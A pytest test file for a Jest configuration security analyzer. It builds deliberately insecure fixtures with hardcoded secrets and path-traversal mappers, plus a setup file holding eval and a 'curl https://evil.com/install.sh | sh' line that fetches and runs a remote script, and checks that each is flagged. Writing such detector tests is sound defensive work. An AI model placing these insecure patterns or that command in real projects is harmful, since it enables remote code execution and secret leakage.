"""Tests for JestAnalyzer."""

import json
from pathlib import Path

from devai.jest_analyzer import JestAnalyzer, JestFinding


INSECURE_JEST_CONFIG = """\
module.exports = {
  testEnvironment: "jsdom",
  testURL: "http://api.example.com",
  globals: {
    API_KEY: "sk-hardcoded-secret-key-12345",
  },
  setupFilesAfterEnv: ["<rootDir>/jest.setup.js"],
  moduleNameMapper: {
    "^@/(.*)$": "../../outside/$1",
  },
  preset: "github:myorg/jest-preset#main",
  testResultsProcessor: "jest-junit",
  bail: false,
  testTimeout: 300000,
};
"""

INSECURE_JEST_SETUP = """\
// jest.setup.js
const apiKey = process.env.SECRET_API_KEY;
eval('console.log(apiKey)');
curl https://evil.com/install.sh | sh
"""

INSECURE_PACKAGE_JSON = {
    "name": "demo",
    "devDependencies": {"jest": "^29.0.0"},
    "jest": {
        "testEnvironment": "node",
        "globals": {"SECRET_TOKEN": "hardcoded-token-value"},
        "moduleNameMapper": {"^~/(.*)$": "../lib/$1"},
        "preset": "jest-preset-node",
    },
}

HARDENED_JEST_CONFIG = """\
module.exports = {
  testEnvironment: "node",
  clearMocks: true,
  resetMocks: true,
  restoreMocks: true,
  bail: 1,
  testTimeout: 10000,
  moduleNameMapper: {
    "^@/(.*)$": "<rootDir>/src/$1",
  },
};
"""


class TestJestAnalyzer:
    def test_detects_insecure_jest_config(self, tmp_path: Path):
        (tmp_path / "jest.config.js").write_text(INSECURE_JEST_CONFIG, encoding="utf-8")
        analyzer = JestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds or "globals_secret" in kinds
        assert "insecure_test_url" in kinds
        assert "path_traversal_mapper" in kinds
        assert "unpinned_git_preset" in kinds

    def test_detects_insecure_package_json_jest(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(
            json.dumps(INSECURE_PACKAGE_JSON, indent=2), encoding="utf-8"
        )
        analyzer = JestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "globals_secret" in kinds
        assert "path_traversal_mapper" in kinds

    def test_detects_eval_in_setup_file_reference(self, tmp_path: Path):
        config = """\
module.exports = {
  setupFilesAfterEnv: ["<rootDir>/jest.setup.js"],
};
"""
        (tmp_path / "jest.config.js").write_text(config, encoding="utf-8")
        (tmp_path / "jest.setup.js").write_text(INSECURE_JEST_SETUP, encoding="utf-8")
        (tmp_path / "package.json").write_text(
            json.dumps({"devDependencies": {"jest": "^29.0.0"}}), encoding="utf-8"
        )
        analyzer = JestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "eval_usage" in kinds or "curl_pipe_shell" in kinds

    def test_hardened_config_has_good_score(self, tmp_path: Path):
        (tmp_path / "jest.config.js").write_text(HARDENED_JEST_CONFIG, encoding="utf-8")
        analyzer = JestAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = JestAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.configs == 0

    def test_finding_format(self):
        finding = JestFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path="jest.config.js",
            lineno=5,
            line="API_KEY=secret",
        )
        assert "[high]" in finding.format()
        assert "jest.config.js:5" in finding.format()

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = JestAnalyzer(str(tmp_path))
        template = analyzer.generate_hardened_config()
        assert "testEnvironment" in template
        assert "clearMocks" in template

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / "jest.config.js").write_text(INSECURE_JEST_CONFIG, encoding="utf-8")
        analyzer = JestAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Jest configuration analysis" in context
        assert "health score" in context

    def test_facade_jest_method(self, tmp_path: Path):
        from devai.facade import DevAI

        (tmp_path / "jest.config.js").write_text(HARDENED_JEST_CONFIG, encoding="utf-8")
        analyzer = DevAI.mock().jest(str(tmp_path))
        assert analyzer.health_score() >= 90.0
